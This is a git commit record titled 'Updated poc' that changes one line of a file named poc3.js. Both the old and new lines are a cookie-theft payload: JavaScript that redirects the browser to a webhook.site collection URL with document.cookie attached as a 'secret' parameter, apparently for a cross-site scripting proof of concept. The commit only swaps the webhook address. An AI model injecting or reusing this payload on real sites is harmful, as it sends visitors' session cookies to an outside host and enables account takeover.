150008e07802378ea19f9fe47e370de77b248777
msc-trash <you@example.com>
2026-08-14 13:59:02 +0200

    Updated poc

--- poc3.js
+++ poc3.js
@@ -1,1 +1,1 @@
-window.location = "https://webhook.site/04d732b9-ea06-4d98-97c9-7d9551251e73?secret=" + JSON.stringify(document.cookie);
+window.location = "https://webhook.site/471e0e61-70ea-4d72-9f36-5faeb0b219a3?secret=" + JSON.stringify(document.cookie);
